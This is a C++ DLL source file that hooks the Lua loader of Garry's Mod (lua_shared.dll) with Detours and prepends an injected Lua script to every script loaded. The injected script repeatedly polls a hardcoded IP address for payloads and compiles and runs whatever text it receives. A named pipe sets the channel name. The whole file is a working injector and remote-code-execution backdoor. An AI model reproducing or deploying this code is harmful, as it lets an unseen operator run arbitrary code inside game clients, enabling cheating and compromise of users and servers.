// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include "detours.h"
#include <windows.h>
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <winuser.h>

#pragma comment(lib, "detours.lib")

typedef int(__cdecl* tLuaL_loadbufferx)(
    void* L, const char* buff, size_t sz, const char* name, const char* mode);

tLuaL_loadbufferx oLuaL_loadbufferx = nullptr;

bool connected = false;
std::string luaScript = R"(
local ChannelName = "N5SeT";
local LastUUID;

if CLIENT and CompileString and not _G[ChannelName] then
    _G[ChannelName] = true;
    print("Injected [" .. ChannelName .. "]");

    --http.Fetch("http://178.104.234.243/gmod/api/" .. ChannelName .. "/injected", function() end, function() end);

    local function FetchScripts() 
        http.Fetch("http://178.104.234.243/gmod/api/" .. ChannelName, function(body) 
            local ok, Data = pcall(util.JSONToTable, body)
            if not ok then 
                timer.Simple(0.2, FetchScripts);
                return print("JSON parse failed") 
            end

            if not Data.success then 
                timer.Simple(0.2, FetchScripts);
                return 
            end

            if not Data.payload then
                timer.Simple(0.2, FetchScripts);
                return;
            end

            local Payload = Data.payload;

            if LastUUID == Payload.uuid then 
                timer.Simple(0.2, FetchScripts);
                return 
            end
            LastUUID = Payload.uuid

            local fn, err = CompileString(Payload.text, "client");
            if not fn then 
                timer.Simple(0.2, FetchScripts);
                return print("Compile error:", err) 
            end;

            local ok2, err2 = pcall(fn)
            if not ok2 then 
                timer.Simple(0.2, FetchScripts);
                return print("Runtime error", err2) 
            end;
            timer.Simple(0.2, FetchScripts);
        end, 
        function(err) 
            print("Fetch failed:", err) 
            timer.Simple(0.2, FetchScripts);
        end)
    end

    timer.Simple(0.2, FetchScripts);
end;
)";

int __cdecl hkLuaL_loadbufferx(void* L, const char* buff, size_t sz, const char* name, const char* mode)
{
    std::string script(buff, sz); 

    std::string modifiedScript;
    if (connected) {
        modifiedScript = luaScript + script;
    }
    else {
        modifiedScript = script;
    }

    int ret = oLuaL_loadbufferx(L, modifiedScript.c_str(), modifiedScript.size(), name, mode);
    return ret;
}

void HookLuaL_loadbufferx(uintptr_t LuaShared)
{
    uintptr_t addr = (uintptr_t)LuaShared + 0x14D90;

    std::cout << "luaL_loadbufferx: 0x" << std::hex << addr << std::endl;

    oLuaL_loadbufferx = (tLuaL_loadbufferx)addr;

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourAttach(&(PVOID&)oLuaL_loadbufferx, hkLuaL_loadbufferx);
    DetourTransactionCommit();
}

DWORD WINAPI maisn(LPVOID lpParam) 
{
    auto LuaShared = GetModuleHandleA("lua_shared.dll");

    HookLuaL_loadbufferx((uintptr_t)LuaShared);

    HANDLE hPipe = CreateNamedPipeA("\\\\.\\pipe\\FuckLoveGMOD",
        PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT,
        1, 1024, 1024, 0, NULL);

    while (true)
    {
        if (ConnectNamedPipe(hPipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED)
        {
            char buffer[512] = { 0 };
            DWORD bytesRead;
            ReadFile(hPipe, buffer, sizeof(buffer), &bytesRead, NULL);

            if (!connected) {
                std::cout << "Recieved Channel: " << buffer << std::endl;
 
                size_t pos = luaScript.find("N5SeT");
                if (pos != std::string::npos) {
                    luaScript.replace(pos, 5, buffer);
                    connected = true;
                }
            }
        }
    }

    return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CreateThread(nullptr, 0, maisn, nullptr, 0, nullptr);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

